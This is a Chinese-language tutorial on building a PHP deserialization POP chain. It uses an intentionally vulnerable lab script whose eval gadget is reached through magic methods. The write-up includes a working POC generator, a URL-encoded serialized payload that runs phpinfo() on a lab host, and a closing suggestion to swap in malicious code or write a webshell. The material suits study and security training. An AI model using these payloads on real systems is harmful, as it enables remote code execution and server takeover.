[TOC]



# ==PHP反序列化漏洞POP调用链构造==

## 一、什么是POP

POP即：面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了

一般的序列化攻击都在PHP魔术方法中出现出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中，这时候就可以构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来

## 二、PHP漏洞代码

请通过反序列化操作，执行任意PHP命令

```php
<?php

class Tiger{
    public $string;
    public $var;
    public function __toString()
    {
        return $this->string;
    }
    public function boss($value) {
        @eval($value);
    }
    public function __invoke()
    {
        $this->boss($this->var);
    }
}

class Lion{
    public $tail;
    public function __construct() 
    {
        $this->tail = array();
    }
    public function __get($name)
    {
        $function = $this->tail;
        return $function();
    }
}

class Monkey{
    public $head;
    public $hand;
    public function __construct($here="Zoo")
    {
        $this->head = $here;
        echo "Welcome to ".$this->head."</br>";
    }
    public function __wakeup()
    {
        if(preg_match("/gopher|http|file|phar|ftp|htps|dict|\.\./i",$this->head)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Elephant{
    public $nose;
    public $nice;
    public function __construct($nice="nice")
    {
        $this->nice = $nice;
        echo $nice;
    }
    public function __toString()
    {
        return $this->nice->nose;
    }
}

if(isset($_GET['zoo'])) {
    @unserialize($_GET['zoo']);
}
else{
    $a = new Monkey();
    echo "Hello PHP!";
}

?>
```

## 三、POP调用链分析

| 方法名     | 调用条件                                                     |
| ---------- | ------------------------------------------------------------ |
| __get      | 读取不可访问或不存在属性时被调用                             |
| __invoke   | 当对象以函数方式调用时被调用                                 |
| __toString | 当一个类被转换成字符串时被调用                               |
| __wakeup   | 当使用unserialize发序列化时被调用，可用来做一些对象初始化的操作 |

### 1、正推分析

- 首先看除函数外的代码，映入眼帘的是判断语句，如果不传值，则直接创建 Monkey 类的实例，此时只会运行Monkey类中的`__construct()` 函数，然后整个代码就结束了

  ![image-20240827203728606](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827203728606.png)

#### 确定起点

- 所以，我们一定得传值。传值后反序列化将会构造新的类实例，经分析后只有Monkey类中含有`__wakeup()`魔术方法，该方法会在反序列化该类实例时自动调用，反观其他几个类，在反序列化该类时，根本不会有任何其他的多余的操作，所以此处选择**反序列化Monkey类实例**

- Monkey类中`__wakeup` 首先进行 if 判断，且使用的是正则匹配，但是又因为正则匹配函数 `preg_match` 中的参数要求都是字符串类型，所以在此，如下代码中`$this->head`将会被作为字符串使用，此时如果`$this->head`是一个类的实例，并且该类的实例具有 `__toString()` 方法，则该方法将会被调用，所以我们**应该构造`$this->head`是一个具有`__toString()` 方法的类的实例**

  ```php
  if(preg_match("/gopher|http|file|phar|ftp|htps|dict|\.\./i",$this->head)) {
              echo "hacker";
              $this->source = "index.php";
  }
  ```

#### 确定 `$this->head`与`__toString()` 位置

- 经过寻找，发现 Elephant 类和 Tiger 类都有 `__toString()`方法。

  ```php
  Tiger: 如果将$this->head构造为Tiger的实例，那么该代码就单单只是返回该类实例的string属性的值，就结束了，无利用价值
  public function __toString()
  {
      return $this->string;
  }
  ```

  ```php
  Elephant: 如果将$this->head构造为Elephant的实例，并且构造Elephant中的nice属性又是另一个新的类实例，并且该类中不具有nose属性，此时就会调用__get()方法
  public function __toString()
  {
      return $this->nice->nose;
  }
  ```

  **所以经分析过后将 `$this->head` 构造为 Elephant 的实例**

#### 确定`$this->nice`位置

- 要想`$this->nice->nose`继续往下走，就需要构造Elephant中的nice属性又是另一个新的类实例，并且该类中不具有nose属性，此时就会调用`__get()`方法，而`__get()`方法只存在于 Lion 类中，所以 **确定`$this->nice`为Lion的实例**

#### 确定`$this->tail`位置

- __get() 方法存在的函数代码如下

  ```php
  public function __get($name)
  {
      $function = $this->tail;
      return $function();
  }
  ```

  如果要想代码继续往下走，就需要`$this->tail`是一个类的实例，然后下方使用`$function()`时，就相当于类的实例被当作函数调用，此时如果该类的实例中具有`__invoke()`方法，那么该方法就会被执行。

  而`__invoke()`方法存在于Tiger类中，所以**构造 `$this->tail`是Tiger类的实例**

#### 确定`$this->var`位置

- 我们来看看`__invoke()`方法所存在的代码

  ```php
  public function boss($value) {
      @eval($value);
  }
  public function __invoke()
  {
      $this->boss($this->var);
  }
  ```

  所以此时我们**只需要构造 `$this->var` 为恶意php代码即可**

### 2、逆推分析

#### 确定终点

`@eval()`函数存在于boss函数中  boss函数被`__invoke`调用  只有当类的实例被当作函数调用 `__invoke`才会被执行

#### 确定`__invoke`被调用的类实例

```php
public function __get($name)
{
    $function = $this->tail;
    return $function();
}
```

只有这段代码存在类实例作为函数调用的可能，**只要`$this->tail`为具有`__invoke`的类的实例**

#### 确定`__get`被调用的类的实例

  读取不可访问或不存在属性时被调用 `__get` 

```php
public function __toString()
{
    return $this->nice->nose;
}
```

这里只需要让 `$this->nice`构造的类实例不具有nose属性就好了

#### 确定 `__toString()` 调用的类实例

```php
if(preg_match("/gopher|http|file|phar|ftp|htps|dict|\.\./i",$this->head)) {
            echo "hacker";
            $this->source = "index.php";
}
```

当一个类被转换成字符串时被调用`__toString()`

preg_match函数中的参数必须是字符串类型，所以**只需要让 `$this->head` 是一个类的实例就好**

而 `$this->head` 刚好就是Monkey类中的属性

## 四、确定并利用POC

```php
<?php
class Tiger{
    public $string;
    public $var = 'phpinfo();';

}

class Lion{
    public $tail;
    function __construct()
    {
        $this->tail = new Tiger();
    }
}

class Elephant{
    public $nose;
    public $nice;
    function __construct()
    {
        $this->nice = new Lion();
    }
}

class Monkey{
    public $head;
    public $hand;
    function __construct()
    {
        $this->head = new Elephant();
    }

}

$a = new Monkey();
echo urlencode(serialize($a));  
?>
```

访问 http://192.168.230.188/unserializevul/unserializePOC.php 获取 POC

```
O%3A6%3A%22Monkey%22%3A2%3A%7Bs%3A4%3A%22head%22%3BO%3A8%3A%22Elephant%22%3A2%3A%7Bs%3A4%3A%22nose%22%3BN%3Bs%3A4%3A%22nice%22%3BO%3A4%3A%22Lion%22%3A1%3A%7Bs%3A4%3A%22tail%22%3BO%3A5%3A%22Tiger%22%3A2%3A%7Bs%3A6%3A%22string%22%3BN%3Bs%3A3%3A%22var%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7Ds%3A4%3A%22hand%22%3BN%3B%7D
```

将POC传给漏洞页面，利用成功

![image-20240827213120599](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827213120599.png)

接下来只需要更换`phpinf();`的值为其他可执行的恶意代码即可，或者使用 `file_put_contents()` 函数写木马

## 五、总结

（1）先要确定起点和终点，如果起点有多个，那么就去尝试最有可能深度进行下一步跳转的一个，起点和终点无法确定，POP链是不可能成功的

（2）一定要牢记不同的魔术方法的自动调用触发条件，如果不太熟悉，则做实验证明，然后理解他

（3）自动触发的跳转过程，会不停的给类变量（属性）赋值，一定要知道该赋什么样的值，通常的值不会是普通类型，而是对象

（4）POP连的分析和构造过程，可以完全忽略非魔术方法或与链条无关的方法和属性

（5）POP的核心在于属性，而不是方法，序列化和反序列化的核心也在属性，而不是方法，所以方法对我们构造POC是无意义的。
